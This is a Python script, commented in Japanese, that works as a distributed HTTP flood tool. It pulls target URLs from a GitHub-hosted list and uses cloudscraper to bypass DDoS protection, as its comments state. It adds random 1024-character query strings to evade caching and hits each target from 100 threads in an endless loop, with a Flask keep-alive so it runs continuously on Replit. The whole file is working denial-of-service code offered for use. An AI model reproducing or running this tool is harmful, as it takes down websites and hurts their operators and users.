
from flask import Flask
from threading import Thread, Lock
import requests
import cloudscraper
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor


# keep-alive関数を定義する
app = Flask('')

@app.route('/')
def main():
  urls = read_urls(list_url)
  return urls

def run():
  app.run(host="0.0.0.0", port=8000)

def keep_alive():
  server = Thread(target=run)
  server.start()
  
# リストに記載されているURLを読み込む関数を定義する
def read_urls(url):
  # requestsモジュールでテキストファイルを取得する
  response = requests.get(url)
  # テキストファイルの内容を改行で分割してリストにする
  urls = response.text.split('\n')
  
  # リストを返す
  return urls

# URLにアクセスする関数を定義する（引数としてロックオブジェクトも受け取る）
def access_url(url, lock):
  list_url = 'https://github.com/Tokaaaaage/323/raw/main/list.txt'

  # リストに記載されているURLを読み込む関数を呼び出す（ロックオブジェクトで排他制御）
  with lock:
    urls = read_urls(list_url)
  
  # cloudscraperモジュールでddos対策プログラムを回避する[^1^][2][2]
  scraper = cloudscraper.create_scraper()
  
  # クエリパラメーターとしてランダムな1024文字の文字列を生成する[^2^][3][3]
  query = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
  
  # URLにクエリパラメーターを付与する
  url += '?' + query
  
   # URLにアクセスしてレスポンスを取得する（エラーが発生した場合は例外処理）
  try:
     response = scraper.get(url)
     print(f'Accessed {url} with status code {response.status_code}')
     return response.status_code
   
  except Exception:
     print(f'Failed to access {url} with error')
     return None

# メインの処理部分（引数としてロックオブジェクトも受け取る）
if __name__ == '__main__':
  
   # keep-alive関数を呼び出してreplitで24時間動かすようにする[1]
   keep_alive()

   # リストに記載されているURLのアドレス（変更可）
   list_url = 'https://github.com/Tokaaaaage/323/raw/main/list.txt'

   # ロックオブジェクトを作成する
   lock = Lock()

   # スレッドプールエグゼキューターを作成する（最大スレッド数は任意で設定）
   executor = ThreadPoolExecutor(max_workers=100)

   # 無限ループでURLにアクセスし続ける（1秒ごと、ミリ秒で指定したいなら少数で書く）
   while True:
     urls = read_urls(list_url)
     for url in urls:
       # スレッドプールエグゼキューターにURLにアクセスする関数とロックオブジェクトを渡す
       executor.submit(access_url, url, lock)
     time.sleep(1)
